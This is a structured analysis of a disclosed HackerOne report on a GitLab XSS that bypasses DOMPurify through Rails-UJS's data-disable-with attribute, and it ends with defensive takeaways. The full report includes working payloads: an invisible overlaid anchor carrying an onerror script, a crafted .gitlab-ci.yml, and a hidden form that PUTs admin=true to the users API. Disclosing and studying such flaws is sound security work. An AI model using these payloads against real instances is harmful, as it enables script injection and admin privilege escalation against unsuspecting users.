# XSS via `v-safe-html` directive - `data-disable-with` attribute bypass

## Metadata
- **Source:** HackerOne
- **Report:** 1579645 | https://hackerone.com/reports/1579645
- **Submitted:** 2022-05-24
- **Reporter:** yvvdwf
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Cross-Site Scripting (XSS), Improper Input Sanitization, Attribute-based XSS
- **CVEs:** None
- **Category:** web-api

## Summary
The `v-safe-html` Vue directive uses DOMPurify to sanitize HTML but fails to block the `data-disable-with` attribute used by Rails-UJS, allowing attackers to inject malicious HTML/JavaScript through job names and error messages. By crafting specially formatted CI job names, attackers can bypass sanitization and execute arbitrary JavaScript or perform unauthorized API requests on behalf of users.

## Attack scenario
1. Attacker creates a malicious `.gitlab-ci.yml` file with job names containing XSS payloads in HTML attributes, specifically leveraging the `data-disable-with` attribute
2. The `data-disable-with` attribute contains JavaScript payloads like `<img src=x onerror=alert(...)>` which bypass the DOMPurify sanitization rules
3. Victim views the CI/CD Jobs page where the malicious job names are displayed in error messages
4. Rails-UJS processes the unfiltered `data-disable-with` attribute and renders its content as HTML
5. When victim interacts with the page (clicking disabled button/link), the JavaScript payload in `data-disable-with` executes
6. Without CSP protection, arbitrary JavaScript executes; with CSP, attacker uses `<form>` tags to perform unauthorized API requests (e.g., privilege escalation)

## Root cause
The `v-safe-html` directive's DOMPurify configuration blocklists specific dangerous attributes (`data-remote`, `data-url`, `data-type`, `data-method`) but fails to blocklist `data-disable-with`, which is processed by Rails-UJS and can contain arbitrary HTML/JavaScript. The sanitizer also permits `style` and `class` attributes, enabling visual manipulation to hide the injected content.

## Attacker mindset
Attacker recognized that sanitization was incomplete - focusing on blocking certain data attributes while missing `data-disable-with` which serves a similar function in Rails framework. Attacker leveraged CSS classes (`fixed-top`, `fixed-bottom`, `text-hide`) to make injected elements invisible/overlay entire page to trick users into interaction, and identified job names as user-controlled input reaching the vulnerable sanitization path.

## Defensive takeaways
- Use allowlist-based HTML sanitization rather than blocklist approach - explicitly define permitted tags/attributes instead of blocking known-bad ones
- Understand framework-specific attributes (Rails-UJS data attributes) and ensure all of them are sanitized consistently
- Apply sanitization uniformly across all user-controlled data that reaches HTML rendering, including error messages and dynamically loaded content
- Implement and enforce strict Content Security Policy (CSP) with `strict-dynamic` to prevent inline script execution as defense-in-depth
- Sanitize `data-*` attributes comprehensively or disable Rails-UJS automatic processing of user-controlled content
- Test sanitization against framework-specific attack vectors, not just generic XSS payloads

## Variant hunting
Review all `v-safe-html` usages for other unblocked HTML5/framework attributes (data-*, aria-*, on* handlers in SVG/MathML contexts)
Check for similar sanitization bypasses in other Vue components or directives using DOMPurify with incomplete configurations
Examine other Rails-UJS data attributes (`data-confirm`, `data-toggle`, `data-target`) for sanitization gaps in different parts of GitLab
Test CSS-based content hiding/overlay techniques combined with other whitelisted attributes to identify additional bypass chains
Search for user-controlled input paths that reach HTML rendering in CI/CD pages (artifacts, logs, variable values, schedule descriptions)

## MITRE ATT&CK
- T1190
- T1566
- T1598

## Notes
Report demonstrates sophisticated understanding of Rails framework mechanics and DOMPurify sanitization logic. Two distinct exploitation paths shown: (1) inline script XSS without CSP and (2) form-based CSRF/privilege escalation with CSP present. Attacker provided working proof-of-concept with actual GitLab.com examples. The visual hiding technique using CSS is particularly notable as it makes the attack harder to detect visually.

## Full report
<details><summary>Expand</summary>

`v-safe-html` directive uses Dompurify [to remove](https://gitlab.com/gitlab-org/gitlab-ui/-/blob/9f1bcb1f7392d4d6d072f10197c2aab2c29c3287/src/directives/safe_html/constants.js#L3)  `data-remote', 'data-url', 'data-type', 'data-method'` attributes from HTML tags. Rails-js relies on another attribute, [`data-disable-with`](https://github.com/rails/rails/blob/v6.1.4.7/actionview/app/assets/javascripts/rails-ujs.coffee#L10) to [show a HTML content](https://github.com/rails/rails/blob/v6.1.4.7/actionview/app/assets/javascripts/rails-ujs/features/disable.coffee#L41) when an user clicks on a disabled link.

For example, the following text will bypass the sanitization and popup an alert when an user clicks on the link (which is a transparent topmost layer since the sanitization allows also `style` and `class` attributes):

```html
<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">'
```

An exploitation can be done via [jobs' error messages](https://gitlab.com/gitlab-org/gitlab/-/blob/38af35c2a4aa666f914484d3f119b813651a2041/app/assets/javascripts/jobs/components/job_app.vue#L215) which contain [CI job names](https://gitlab.com/gitlab-org/gitlab/-/blob/7f86b5b78c107f7124b54e1f797099741765b3d2/app/serializers/build_details_entity.rb#L154) which are provided by users.



### Steps to reproduce

1. In an existing project or create a new one, add `.gitlab.ci` file with the following content:

```yaml
'1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">':
  stage: build
  script: echo "hi"

'2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>':
  stage: build
  script: echo "hi"

trigger-xss:
  stage: test
  script: echo "hi"
  dependencies:
    - '1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">'
    - '2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>'
```

2. Go to `CI/CD`/`Jobs` tab and wait for the CI jobs finished

3. If you are testing on a local instance without CSP protection, click on detail of the job `1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">`, then click on the trash button on the right literal bar to `Erase job logs and artifacts`.

3. Go back to the job list, click on `trigger-xss` link to view the detail of this job. Then click on `Retry` button on the right literal bar to retry the job.

4. An error message appears: `This job could not start because it could not retrieve the needed artifacts: 1. XSS when no CSP`. Click anywher to trigger the alert

Note: on gitlab.com or an instance having CSP protection (with `strict-dynamic` value of `script-src`), the inline script, such as `onerror` or the [`<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>`](https://gitlab.com/gitlab-org/gitlab/-/issues/233473), will be prevented to trigger. In such a case, we may use `<form>` tag to trigger arbitrary API requests on behalf of the user, for example, this allows escalate to admin permission when administrator *click anywhere* `2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>`

### Impact

XSS allow attackers to perform arbitrary actions on behalf of victims at client side.

### Examples

https://gitlab.com/yvvdwf/xss-in-job-dependencies/-/jobs/2498306483

https://gitlab.com/yvvdwf/xss-in-job-dependencies/-/jobs/2498287882

### Output of checks

This bug happens on GitLab.com

## Impact

XSS allow attackers to perform arbitrary actions on behalf of victims at client side.

</details>

---
*Analysed by Claude on 2026-05-12*
